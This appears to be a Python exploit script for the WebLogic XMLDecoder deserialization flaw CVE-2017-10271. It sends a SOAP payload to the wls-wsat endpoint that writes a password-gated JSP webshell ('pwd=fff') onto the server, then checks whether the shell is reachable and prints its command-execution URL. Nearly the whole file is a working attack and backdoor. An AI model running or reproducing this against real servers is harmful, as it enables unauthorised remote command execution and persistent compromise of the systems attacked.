# -*- coding: utf-8 -*-
import sys
import requests
import time
from random import *
import string



'''
Usage:
    moon.py -u  weblogic http://127.0.0.1:7001
    Version: 10.3.6.0.0, 12.1.3.0.0, 12.2.1.1.0 and 12.2.1.2.0
    Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。
    访问：http://域名:默认weblogic端口/wls-wsat/CoordinatorPortType ，如果存在相关内容则存在漏洞
'''

def gen_shell():
    min_char = 4
    max_char = 12
    allchar = string.ascii_letters + string.digits
    shell_name = "".join(choice(allchar) for x in range(randint(min_char, max_char)))
    return shell_name


def attack(URL):
    print('[+]开始检测-Weblogic-CVE-2017-10271。[+]')
    shellname = gen_shell()
    data = """
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
    <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
    <java><java version="1.4.0" class="java.beans.XMLDecoder">
    <object class="java.io.PrintWriter"> 
    <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/"""+shellname+""".jsp</string>
    <void method="println"><string>
    <![CDATA[
<%
    if("fff".equals(request.getParameter("pwd"))){
        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();
        int a = -1;
        byte[] b = new byte[2048];
        out.print("<pre>");
        while((a=in.read(b))!=-1){
            out.println(new String(b));
        }
        out.print("</pre>");
    }
%>
    ]]>
    </string>
    </void>
    <void method="close"/>
    </object></java></java>
    </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body/>
</soapenv:Envelope> 
"""
    url = f'{URL}/wls-wsat/CoordinatorPortType'
    #proxies = {'http': 'http://localhost:8080', 'https': 'http://localhost:8080'}
    headers = {"Content-Type":'text/xml',
               "User-Agent":'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36'}
    r = requests.post(url,data=data, headers=headers)
    print('上传返回值为500为成功。上传返回值为：' + str(r.status_code))
    try:
        r1 = requests.get(f'{URL}/bea_wls_internal/{shellname}.jsp')
        if r1.status_code == 200:
            print(f'webshell地址为：{URL}/bea_wls_internal/{shellname}.jsp?pwd=fff&cmd=whoami')
        else:
            print('获取shell失败。')
    except:
        print('获取shell失败。')
    print('[+]检测结束-Weblogic-CVE-2017-10271。[+]')
    print('\n')

if __name__ == "__main__":
    attack()